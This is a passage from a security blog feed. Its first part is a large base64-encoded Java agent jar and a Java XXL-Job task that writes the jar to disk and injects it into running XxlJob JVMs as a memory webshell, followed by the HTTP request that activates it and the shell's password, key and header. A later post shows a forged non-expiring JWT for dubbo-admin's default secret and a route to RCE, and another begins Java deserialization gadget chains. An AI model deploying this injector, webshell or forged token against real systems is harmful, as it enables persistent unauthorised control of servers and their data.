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&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">code22</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">code23</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">code24</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">code25</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">code26</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">code27</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">code28</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">code29</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">shell</span> <span class="hljs-operator">=</span> code1+code2+code3+code4+code5+code6+code7+code8+code9+code10+code11+code12+code13+code14+code15+code16+code17+code18+code19+code20+code21+code22+code23+code24+code25+code26+code27+code28+code29;<br>        <span class="hljs-type">byte</span>[] decode = Base64.getDecoder().decode(shell);<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;agent.jar&quot;</span>);<br>        fileOutputStream.write(decode);<br>        fileOutputStream.close();<br><br>        List&lt;VirtualMachineDescriptor&gt; vmList = VirtualMachine.list();<br>        <span class="hljs-keyword">for</span> (VirtualMachineDescriptor vmd : vmList) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> vmd.displayName();<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">if</span> (name.length() &gt; <span class="hljs-number">0</span>  &amp;&amp; name.contains(<span class="hljs-string">&quot;XxlJob&quot;</span>))&#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span>)&#123;<br>                        XxlJobHelper.log(<span class="hljs-string">&quot;-------------------&quot;</span>);<br>                        XxlJobHelper.log(<span class="hljs-string">&quot;name &gt;&gt;&gt; &quot;</span> + vmd.displayName());<br>                        XxlJobHelper.log(<span class="hljs-string">&quot;id &gt;&gt;&gt; &quot;</span> + vmd.id());<br>                        <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(Runtime.getRuntime().exec(<span class="hljs-string">&quot;java -jar agent.jar &quot;</span>+vmd.id()).getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>).next().getBytes();<br>                        XxlJobHelper.log(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(bytes, <span class="hljs-string">&quot;UTF-8&quot;</span>));<br>                    &#125;<br>                &#125;<br>            &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                XxlJobHelper.log(<span class="hljs-string">&quot;注入失败&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="0x02-流程"><a href="#0x02-流程" class="headerlink" title="0x02 流程"></a>0x02 流程</h3><p>在webIDe写人上面poc，执行后，查看日志记录</p><p><img src="1725380906137-2aab28f7-09b8-42bc-9a12-bfdc4e6ae9a1.png" alt="img"></p><p><img src="1725380748913-e6d3e08f-8c04-4073-ba1b-b823c310a6d0.png" alt="img"></p><p>顺利的话，显示如上注入信息，会给注册中心，和执行器都搭上agent马子。</p><p>访问存在且不需要鉴权路由的url，发送以下数据包，激活内存马。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/xxl-job-admin/static/favicon.ico</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:8080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; magic Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>image/avif,image/webp,*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br></code></pre></td></tr></table></figure><p>内存马密码</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs http">加密器: JAVA_AES_BASE64<br>密码: Izxxeyhtv<br>密钥: Eijxhrbh<br>请求路径: /*<br>请求头: User-Agent: Imznr<br>脚本类型: JSP<br></code></pre></td></tr></table></figure><p><img src="1725380604466-471cba55-9805-44a6-a884-d68112cd1a6c.png" alt="img"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Default jwt information leaks to RCE</title>
    <link href="/2024/09/16/dubbo-admin-JWT2RCE/"/>
    <url>/2024/09/16/dubbo-admin-JWT2RCE/</url>
    
    <content type="html"><![CDATA[<h2 id="dobbo-admin-Default-jwt-information-leaks-to-RCE"><a href="#dobbo-admin-Default-jwt-information-leaks-to-RCE" class="headerlink" title="dobbo- admin Default jwt information leaks to RCE"></a>dobbo- admin Default jwt information leaks to RCE</h2><p>​ 年前挖的，apache没给cve，就出了个公告。没意思</p><h3 id="0x01-analysis"><a href="#0x01-analysis" class="headerlink" title="0x01 analysis"></a>0x01 analysis</h3><p> org&#x2F;apache&#x2F;dubbo&#x2F;admin&#x2F;utils&#x2F;JwtTokenUtil.java#generateToken()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">generateToken</span><span class="hljs-params">(String rootUserName)</span> &#123;<br>    Map&lt;String, Object&gt; claims = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;(<span class="hljs-number">1</span>);<br>    claims.put(<span class="hljs-string">&quot;sub&quot;</span>, rootUserName);<br>    <span class="hljs-keyword">return</span> Jwts.builder()<br>            .setClaims(claims)<br>            .setExpiration(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(System.currentTimeMillis() + expiration))<br>            .setIssuedAt(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(System.currentTimeMillis()))<br>            .signWith(defaultAlgorithm, secret)<br>            .compact();<br>&#125;<br></code></pre></td></tr></table></figure><p>Here is how jwttoken handles it, including authentication time, expiration time, username.</p><p>org&#x2F;apache&#x2F;dubbo&#x2F;admin&#x2F;utils&#x2F;JwtTokenUtil.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">* Jwt signingKey configurable<br> */<br><span class="hljs-meta">@Value(&quot;$&#123;admin.check.signSecret:&#125;&quot;)</span><br><span class="hljs-keyword">public</span> String secret;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * token timeout configurable</span><br><span class="hljs-comment"> * default to be an hour: 1000 * 60 * 60</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">@Value(&quot;$&#123;admin.check.tokenTimeoutMilli:&#125;&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">long</span> expiration;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * default SignatureAlgorithm</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">SignatureAlgorithm</span> <span class="hljs-variable">defaultAlgorithm</span> <span class="hljs-operator">=</span> SignatureAlgorithm.HS512;<br></code></pre></td></tr></table></figure><p> This class defines fixed secret, expiration, default algorithms. Now that we know the encryption method, we can use fake jwt to log in and bypass it. </p><p>​    @Value(“${admin.check.signSecret:}”).  </p><p>The default key in the configuration. </p><p><img src="image-20240128002238330.png" alt="image-20240128002238330"></p><p>org&#x2F;apache&#x2F;dubbo&#x2F;admin&#x2F;authentication&#x2F;impl&#x2F;DefaultPreHandle.java#authentication()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">authentication</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> &#123;<br>        <span class="hljs-type">HandlerMethod</span> <span class="hljs-variable">handlerMethod</span> <span class="hljs-operator">=</span> (HandlerMethod) handler;<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> handlerMethod.getMethod();<br>        <span class="hljs-type">Authority</span> <span class="hljs-variable">authority</span> <span class="hljs-operator">=</span> method.getDeclaredAnnotation(Authority.class);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> == authority) &#123;<br>            authority = method.getDeclaringClass().getDeclaredAnnotation(Authority.class);<br>        &#125;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">&quot;Authorization&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != authority &amp;&amp; authority.needLogin()) &#123;<br>            <span class="hljs-comment">//check if &#x27;authorization&#x27; is empty to prevent NullPointException</span><br>            <span class="hljs-keyword">if</span> (StringUtils.isEmpty(token)) &#123;<br>                <span class="hljs-comment">//While authentication is required and &#x27;Authorization&#x27; string is missing in the request headers,</span><br>                <span class="hljs-comment">//reject this request(http403).</span><br>                AuthInterceptor.authRejectedResponse(response);<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (jwtTokenUtil.canTokenBeExpiration(token)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-comment">//while user not found, or token timeout, reject this request(http401).</span><br>            AuthInterceptor.loginFailResponse(response);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p> Here you can analyze it, get jwt from Authorization, and then determine the expiration time.  Now we have a way to encrypt it, which is for a long-term jwt. </p><p> The jwt of the 99999999999 timestamp finally constructed. </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">eyJhbGciOiJIUzUxMiJ9.eyJleHAiOjk5OTk5OTk5OTksInN1YiI6InJvb3QiLCJpYXQiOjE2OTkwODM2Mzd9.wKRqJkWxr_nVDcVVF5rniqhnACtqaDnYUUu55g-atkIwRIt1A-SMpKqBN5zrGZl4kFVcrjzMvXsYqfqf0N9Gbg<br></code></pre></td></tr></table></figure><h3 id="0x03-exploits"><a href="#0x03-exploits" class="headerlink" title="0x03 exploits"></a>0x03 exploits</h3><p> There is already a jwt that does not expire, that can be tried using </p><p> In org.apache.dobo.admin.controller </p><p><img src="image-20240128004005909.png" alt="image-20240128004005909"></p><p> You can view all services. </p><p><img src="image-20240128004030376.png" alt="image-20240128004030376"></p><p><img src="image-20240128004100330.png" alt="image-20240128004100330"></p><p> Then according to the name of the service, you can query the details of the corresponding service </p><p><img src="image-20240128021308399.png"></p><p><img src="image-20240128004538744.png" alt="image-20240128004538744"></p><p> You can get the address of the service, dubbo version, hessian protocol, method, and type of value passed. </p><p> Think about whether you can find dubbo versions of vulnerabilities that cause exploits. </p><h3 id="0x04-exploit"><a href="#0x04-exploit" class="headerlink" title="0x04 exploit"></a>0x04 exploit</h3><p> This service is dobbo-admin’s own service.  We register one ourselves. </p><p> Here we directly use the dubbo official website example to register. </p><p><img src="image-20240128010015233.png" alt="image-20240128010015233"></p><p>org.apache.dubbo.samples.api.HelloService</p><p><img src="image-20240128012244192.png" alt="image-20240128012244192"></p><p> Query service details. </p><p><img src="image-20240128010234284.png" alt="image-20240128010234284"></p><p> The method parameter.  The most important is the version, 3.0.13. </p><p> Then we know Apache Dubbo CVE-2023-23638.  Check for Serializable interfaces. This option is enabled by default in&gt;&#x3D; 3.1.6, which prevents the serialization and deserialization of non-Serializable interface implementation classes.  Apache mailist content can be found to be vulnerable to ‘Generic Invoke’, that is, generalized calls.  In simple terms, generalized invocation allows us to invoke a method of the corresponding Service without relying on a specific interface API.  </p><p>For more information on generalization calls, please see: <a href="https://cn.dubbo.apache.org/zh-cn/overview/tasks/develop/generic/">https://cn.dubbo.apache.org/zh-cn/overview/tasks/develop/generic/</a></p><p> Generic Invoke This example has ready-made code and is ready to use. </p><p><img src="image-20240128021213585.png"></p><p> Some need to configure the qos.Port, read out the specific information. </p><p> Configure the information, start attacking and exploiting </p><p><img src="image-20240916194023601.png" alt="image-20240916194023601"> Duboob generalization is attackable. </p><h3 id="0x05-summary"><a href="#0x05-summary" class="headerlink" title="0x05 summary"></a>0x05 summary</h3><pre><code class="hljs">     Use jwt to view services in the background, and use interfaces to view service details.  If the dubbo used by the microservice is a vulnerable version, an attack using GenericService can be attempted.  Examples of websites are available.  However, microservices are generally placed on the intranet and are suitable for intranet penetration.  Attack difficulty is high.  In essence, too much information was leaked. </code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Tomcat9 to 11 Full version stack overflow vulnerability (Apache does not receive)</title>
    <link href="/2024/09/04/Tomcat9-to-11-dos/"/>
    <url>/2024/09/04/Tomcat9-to-11-dos/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="83ab454d19182f6b2360ab7c20a28c8a06403c8e925f43bbe0f297a79719678d"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>java反序列二周目(一)</title>
    <link href="/2024/08/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%BA%8C%E5%91%A8%E7%9B%AE-%E4%B8%80/"/>
    <url>/2024/08/23/java%E5%8F%8D%E5%BA%8F%E5%88%97%E4%BA%8C%E5%91%A8%E7%9B%AE-%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​最近黑神话悟空火热，大家都开启二周目。现在正直网安特殊时间，时间较多，随准备重走一遍反序列取经路，看看有没有新的触发方式，记录一下，方便以后直接使用。</p><h2 id="0x01-commons-collections-map-get"><a href="#0x01-commons-collections-map-get" class="headerlink" title="0x01 commons.collections (map.get)"></a>0x01 commons.collections (map.get)</h2><p>​最经典的反序列化gadget，触发点</p><p>LazyMap.get    这里LazyMap可以换成DefaultedMap (<strong>3.1没有这个类</strong>)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">LazyMap.get()/TransformedMap.setValue()<br>    ChainedTransformer.transform()<br>        ConstantTransformer.transform()<br>            InvokerTransformer.transform()<br></code></pre></td></tr></table></figure><p>org.apache.commons.collections.map.DefaultedMap#get</p><p><img src="image-20240823135940290.png" alt="image-20240823135940290"></p><p>DefaultedMap的value可控，后面大差不差</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">decorate</span> <span class="hljs-operator">=</span> DefaultedMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantFactory</span>(<span class="hljs-number">1</span>));<br><span class="hljs-type">Field</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> DefaultedMap.class.getDeclaredField(<span class="hljs-string">&quot;value&quot;</span>);<br>value.setAccessible(<span class="hljs-literal">true</span>);<br>value.set(decorate,chain);<br></code></pre></td></tr></table></figure><p>org.apache.commons.collections.keyvalue.TiedMapEntry</p><p><img src="image-20240823134729920.png" alt="image-20240823134729920"></p><p><img src="image-20240823134736608.png" alt="image-20240823134736608"></p><p><img src="image-20240823134748543.png" alt="image-20240823134748543"></p><p><img src="image-20240823134818012.png" alt="image-20240823134818012"></p><p>也就是TiedMapEntry的equals，hashCode，toString 